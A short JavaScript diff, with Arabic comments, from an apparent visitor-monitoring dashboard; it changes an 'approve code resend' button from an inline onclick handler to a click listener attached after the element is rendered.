@@ -1291,8 +1291,15 @@
             // إضافة زر موافقة لطلب إعادة إرسال الرمز
             if (dataEntry.content && dataEntry.content['طلب'] === 'إعادة إرسال رمز') {
               html += '<div class="flex gap-2 mt-3">';
-              html += '<button onclick="approveResendCode(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
+              html += '<button id="resend-btn-' + visitor.socketId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium cursor-pointer"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
               html += '</div>';
+              // إضافة event listener بعد إنشاء العنصر
+              setTimeout(() => {
+                const btn = document.getElementById('resend-btn-' + visitor.socketId);
+                if (btn) {
+                  btn.addEventListener('click', () => approveResendCode(visitor.socketId));
+                }
+              }, 100);
             }
             
             html += '</div>';
